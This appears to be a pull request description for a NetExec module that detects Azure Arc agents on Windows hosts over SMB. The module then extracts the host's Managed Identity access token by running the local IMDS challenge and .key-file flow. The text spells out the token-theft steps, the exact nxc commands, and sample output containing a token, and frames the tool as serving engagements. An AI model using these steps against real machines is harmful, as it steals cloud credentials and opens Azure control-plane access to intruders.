New module, **`azurearc`**, which detects whether a Windows host is Azure Arc–enabled and, if so, retrieves a **Managed Identity access token** from the local Arc IMDS endpoint using the documented 401 challenge → `.key` file → second request flow.

## Behavior:
Presence check via SMB listing of:
C:\Program Files\AzureConnectedMachineAgent\*
C:\Program Files (x86)\AzureConnectedMachineAgent\*

Token retrieval executed locally on target with PowerShell:
1. GET http://localhost:40342/metadata/identity/oauth2/token?resource=...&api-version=...
→ expect 401 with WWW-Authenticate: Basic realm="<path to .key>"
Read .key contents (local admin privileges required)
2. second GET with Authorization: Basic <key>.
Write JSON to outfile, fetch via SMB, delete outfile.


- **Protocols:** SMB (requires administrative privileges)
- **Capabilities:**
  - **CHECK mode:** enumerate presence of the Azure Connected Machine Agent (Arc) by listing well-known install paths
  - **Default mode:** perform the IMDS challenge/response locally on the target and return the JSON containing the `access_token`
- **Use case:** Quickly map Arc deployment across estate and retrieve a cloud-scoped token for Azure control-plane actions during engagements.

---

## Screenshot
<img width="1201" height="450" alt="2025-10-05_16h20_40" src="https://github.com/user-attachments/assets/8b824c35-7595-43f1-90f1-627bb9962712" />

<img width="1189" height="391" alt="2025-10-05_17h29_40" src="https://github.com/user-attachments/assets/b25305f9-1946-4e6c-8c9f-028e0bded0ff" />


**Presence check only (Arc installed)**
nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc -o CHECK=true
[+] Azure Arc agent appears to be installed

**Presence check only (Arc not installed)**
nxc smb 192.168.1.101 -u USER -p 'PASS' -M azurearc -o CHECK=true
[-] Azure Arc agent not found

**Dump token (success)**
nxc smb 192.168.1.100 -u USER -p 'PASS' -M azurearc
[*] Attempting to retrieve Azure Arc Managed Identity access token
[+] Managed Identity token retrieved
{
"access_token":"eyJhbGciOi...<redacted>...",
"expires_on":"1730812345",
"token_type":"Bearer",
"resource":"https://management.azure.com
"
}

# Setup guide for the review
git clone https://github.com/Pennyw0rth/NetExec.git
* Add the module file at:
nxc/modules/azurearc.py


# Run from source against a lab target
* python -m nxc.netexec smb 192.168.1.100 -u USER -p 'PASS' -M azurearc -o CHECK=true
* python -m nxc.netexec smb 192.168.1.100 -u USER -p 'PASS' -M azurearc
